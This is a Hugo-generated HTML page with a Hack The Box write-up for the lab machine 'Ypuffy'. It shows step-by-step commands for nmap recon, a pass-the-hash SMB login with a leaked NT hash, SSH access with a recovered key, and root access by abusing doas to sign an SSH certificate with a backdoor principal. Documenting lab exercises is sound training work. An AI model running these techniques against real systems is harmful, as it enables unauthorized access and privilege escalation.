@@ -1,0 +1,680 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="External Recon # Let&rsquo;s start with nmap. But let&rsquo;s spice it up a bit with an additional script:
+nmap -sC -sV -oN initial --script discovery 10.10.10.107
+The output is quite big. You can the output here.
+The script tries to get as much information as possible of your target and in this case shows some LDAP information and the following open ports:
+Open Ports 22, 80, 139, 389, 445 [Top]">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="//localhost:1313/docs/htb-writeups/ypuffy/">
+  <meta property="og:site_name" content="www.tagnull.de">
+  <meta property="og:title" content="Ypuffy">
+  <meta property="og:description" content="External Recon # Let’s start with nmap. But let’s spice it up a bit with an additional script:
+nmap -sC -sV -oN initial --script discovery 10.10.10.107
+The output is quite big. You can the output here.
+The script tries to get as much information as possible of your target and in this case shows some LDAP information and the following open ports:
+Open Ports 22, 80, 139, 389, 445 [Top]">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="docs">
+    <meta property="article:published_time" content="2019-02-09T00:00:00+00:00">
+    <meta property="article:modified_time" content="2019-02-09T00:00:00+00:00">
+<title>Ypuffy | www.tagnull.de</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/logo.png" >
+<link rel="canonical" href="//localhost:1313/docs/htb-writeups/ypuffy/">
+<link rel="stylesheet" href="/book.min.ed4ea100bc0474b4bd01f1e54b29b3e384852ec121eefa92d93ca6dba227b292.css" integrity="sha256-7U6hALwEdLS9AfHlSymz44SFLsEh7vqS2Tym26InspI=" crossorigin="anonymous">
+  <script defer src="/fuse.min.js"></script>
+  <script defer src="/en.search.min.697b21d89c9b6357b14c83a508ae07999a93e55e5374163085fbf555de2c6d4d.js" integrity="sha256-aXsh2JybY1exTIOlCK4HmZqT5V5TdBYwhfv1Vd4sbU0=" crossorigin="anonymous"></script>
+
+  
+
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>www.tagnull.de</span>
+  </a>
+</h2>
+
+
+<div class="book-search hidden">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <span>Cheatsheet</span>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-2860456b7de11418b89bc572c43149f3" class="toggle"  />
+    <label for="section-2860456b7de11418b89bc572c43149f3" class="flex justify-between">
+      <a role="button" class="">Enumeration</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cheatsheet/enumeration/nmap/" class="">network</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cheatsheet/enumeration/web/" class="">web</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-300439dc6c81e7f8106c3eab98675b63" class="toggle"  />
+    <label for="section-300439dc6c81e7f8106c3eab98675b63" class="flex justify-between">
+      <a role="button" class="">Active directory</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-f1c85964cb4e1e3e13dfaf4558a33249" class="toggle" checked />
+    <label for="section-f1c85964cb4e1e3e13dfaf4558a33249" class="flex justify-between">
+      <a role="button" class="">Htb writeups</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/htb-writeups/bountyhunter/" class="">BountyHunter</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/htb-writeups/cap/" class="">Cap</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/htb-writeups/the-notebook/" class="">The Notebook</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/htb-writeups/traceback/" class="">Traceback</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/htb-writeups/ret2plt-exploit/" class="">Exploit-Development - ret2plt</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/htb-writeups/safe/" class="">Safe</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/htb-writeups/fortune/" class="">Fortune</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/htb-writeups/onetwoseven/" class="">OneTwoSeven</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/htb-writeups/querier/" class="">Querier</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/htb-writeups/irked/" class="">Irked</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/htb-writeups/gettinghashes/" class="">NTLM Hashes via GPO redirect</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/htb-writeups/stratosphere/" class="">Stratosphere</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/htb-writeups/access/" class="">Access</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/htb-writeups/ypuffy/" class="active">Ypuffy</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/htb-writeups/secnotes/" class="">SecNotes - WriteUp</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-eba9495c08f1740750b4c94d7ec66515" class="toggle"  />
+    <label for="section-eba9495c08f1740750b4c94d7ec66515" class="flex justify-between">
+      <a role="button" class="">Oscp</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/oscp/oscp-reporting/" class="">Path to OSCP</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/oscp/oscp-exploitdev/" class="">Path to OSCP - Exploit Development</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/oscp/oscp-review/" class="">Path to OSCP - Review</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Ypuffy</strong>
+
+  <label for="toc-control">
+    
+  </label>
+</div>
+
+
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown book-article"><p align="center">
+  <img src="ypuffy-Banner.png" />
+</p>
+<hr>
+<h1 id="external-recon">
+  External Recon
+  <a class="anchor" href="#external-recon">#</a>
+</h1>
+<p>Let&rsquo;s start with nmap. But let&rsquo;s spice it up a bit with an additional script:</p>
+<p><code>nmap -sC -sV -oN initial --script discovery 10.10.10.107</code></p>
+<p>The output is quite big. You can the output <a href="https://www.tagnull.de/post/ypuffy/nmap.txt">here</a>.</p>
+<p>The script tries to get as much information as possible of your target and in this case shows some LDAP information
+and the following open ports:</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">Open Ports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">22, 80, 139, 389, 445</td>
+</tr>
+</tbody>
+</table>
+<p>
+  <a href="/#top">[Top]</a></p>
+<h1 id="explore">
+  Explore
+  <a class="anchor" href="#explore">#</a>
+</h1>
+<p>The <code>sambaNTPassword</code> Hash immediately caught my attention.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B</span></span></code></pre></div>
+<p>
+  <img src="alice-hash.png" alt="Alice-Hash" /></p>
+<p>As this is very juicy information. I paused my enumeration and tried to exploit this.
+But how?</p>
+<p>Password hashes are often used as a substitude to passwords. Which means, you don&rsquo;t
+need the original password to authenticate to a service. Just the hash. This is how
+your corporate single-sign-on stuff works. Otherwise you would have to login every time.
+So it&rsquo;s a convenience thing.</p>
+<p>The method is called Pass-The-Hash. And of cause there are tools out there, that help
+you with this. Like: <code>pth-smbclient</code>. If you don&rsquo;t have it, just got to github and get the <code>pth-toolkit</code>.</p>
+<p>
+  <a href="/#top">[Top]</a></p>
+<h1 id="exploit">
+  Exploit
+  <a class="anchor" href="#exploit">#</a>
+</h1>
+<p>After fiddeling around with the options, syntax and where to connect to I managed to connect to alice
+share:</p>
+<p><code>pth-smbclient --user=alice1978 --pw-nt-hash -m smb3 \\\\10.10.10.107\\alice 0B186E661BBDBDCF6047784DE8B9FD8B</code></p>
+<p>And we find a private key in &ldquo;ppk&rdquo; format.</p>
+<p>
+  <img src="smb-connect-alice.png" alt="SMB-Connect-Alice" /></p>
+<p>After downloading the file, and trying to use it as a key to access ssh I got an error.
+This format is not compatible with ssh. So, I tried converting it. A quick googlesearch helped
+me finding the correct command for this task. But first we need to install putty-tools.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>puttygen my_private_key.ppk -O private-openssh -o id_rsa
+</span></span><span style="display:flex;"><span>mv ~/.ssh
+</span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">600</span> id_rsa
+</span></span><span style="display:flex;"><span>ssh -i id_rsa alice1978@10.10.10.107</span></span></code></pre></div>
+<p>
+  <a href="/#top">[Top]</a></p>
+<h1 id="user-flag">
+  User Flag
+  <a class="anchor" href="#user-flag">#</a>
+</h1>
+<p>As you can see in the screenshot. A simple <code>ls</code> gives us the &ldquo;user.txt&rdquo;.</p>
+<p>
+  <img src="shell-alice.png" alt="Shell-Alice" /></p>
+<p>
+  <a href="/#top">[Top]</a></p>
+<h1 id="internal-recon">
+  Internal Recon
+  <a class="anchor" href="#internal-recon">#</a>
+</h1>
+<p>A quick <code>uname -a</code> reveals a BSD box. Which was quite handy. Shortly after this box
+was released an exploit for the XORG component of most BSD boxes was published. It&rsquo;s local privesc which gives you root access.
+This is something you only get by googleing or being up-to-date with infosec news.
+This was the route I took to root the box.</p>
+<p>However the intended method was a bit more tricky. While searching the directory structure I noticed
+a folder &ldquo;userca&rdquo;.<br>
+&ldquo;CA&rdquo; in this context mostly means &ldquo;Certificate Authority&rdquo; and is there to sign certificates or issue new keys. Let&rsquo;s say: &ldquo;ssh&rdquo;.</p>
+<p>Furthermore BSD has something like <code>sudo</code>, called <code>doas</code>. Let&rsquo;s check what we can do on this box.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ypuffy$ cat /etc/doas.conf
+</span></span><span style="display:flex;"><span>permit
+</span></span><span style="display:flex;"><span>keepenv :wheel
+</span></span><span style="display:flex;"><span>permit nopass alice1978 as userca cmd /usr/bin/ssh-keygen</span></span></code></pre></div>
+<p>We indeed can run <code>ssh-keygen</code>. But when we try, we are prompted for a password. Let&rsquo;s dig deeper in the ssh route.
+There&rsquo;s a password somewhere for sure.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ypuffy$ cat sshd_config
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type<span style="color:#f92672">=</span>principals&amp;username<span style="color:#f92672">=</span>%u</span></span></code></pre></div>
+<p>So, apparently we can issue a <code>curl</code> to the &ldquo;CA&rdquo;&hellip;I guess, not sure what happens here. I still need to look this up&hellip;</p>
+<p>
+  <a href="/#top">[Top]</a></p>
+<h1 id="privilege-escalation">
+  Privilege Escalation
+  <a class="anchor" href="#privilege-escalation">#</a>
+</h1>
+<p>Let&rsquo;s step back and catch up with the XORG exploit first.
+The exploit is fairly easy to use. Just get it from <a href="https://www.exploit-db.com/exploits/45742" target="_blank">Exploit-db</a>.
+It&rsquo;s very easy to use.</p>
+<ul>
+<li>Download</li>
+<li>chmod +x</li>
+<li>run</li>
+<li>root
+<br>
+<br></li>
+</ul>
+<p>Let&rsquo;s get back to the <code>curl</code> command and check what we can do with it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ypuffy$ /usr/local/bin/curl <span style="color:#e6db74">&#34;http://127.0.0.1/sshauth?type=principals&amp;username=root&#34;</span>
+</span></span><span style="display:flex;"><span>3m3rgencyB4ckd00r</span></span></code></pre></div>
+<p>For whatever reason we get this string back: <code>3m3rgencyB4ckd00r</code> - obviously the missing password.
+Let&rsquo;s create a key and try signing it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ypuffy$ ssh-keygen -t rsa
+</span></span><span style="display:flex;"><span>ypuffy$ mv id_rsa.pub /tmp
+</span></span><span style="display:flex;"><span>ypuffy$ doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -n 3m3rgencyB4ckd00r -I <span style="color:#e6db74">&#34;algo&#34;</span> -z <span style="color:#ae81ff">1</span> id_rsa.pub
+</span></span><span style="display:flex;"><span>  Signed user key id_rsa-cert.pub: id <span style="color:#e6db74">&#34;algo&#34;</span> serial <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">for</span> 3m3rgencyB4ckd00r valid forever
+</span></span><span style="display:flex;"><span>ypuffy$ cp id_rsa-cert.pub /home/alice1978/.ssh/</span></span></code></pre></div>
+<p>This seems to work so far. But can we login now?</p>
+<p>
+  <a href="/#top">[Top]</a></p>
+<h1 id="root-flag">
+  Root Flag
+  <a class="anchor" href="#root-flag">#</a>
+</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ypuffy$ ssh root@localhost
+</span></span><span style="display:flex;"><span>OpenBSD 6.3 <span style="color:#f92672">(</span>GENERIC<span style="color:#f92672">)</span> <span style="color:#75715e">#100: Sat Mar 24 14:17:45 MDT 2018</span>
+</span></span><span style="display:flex;"><span>ypuffy# id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>wheel<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>wheel<span style="color:#f92672">)</span>, 2<span style="color:#f92672">(</span>kmem<span style="color:#f92672">)</span>, 3<span style="color:#f92672">(</span>sys<span style="color:#f92672">)</span>, 4<span style="color:#f92672">(</span>tty<span style="color:#f92672">)</span>, 5<span style="color:#f92672">(</span>operator<span style="color:#f92672">)</span>, 20<span style="color:#f92672">(</span>staff<span style="color:#f92672">)</span>, 31<span style="color:#f92672">(</span>guest<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>ypuffy# ls
+</span></span><span style="display:flex;"><span>  root.txt</span></span></code></pre></div>
+<p>This is it. We got the box. =)</p>
+<p>See ya next time!</p>
+<p>x41</p>
+<p>
+  <a href="/#top">[Top]</a></p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
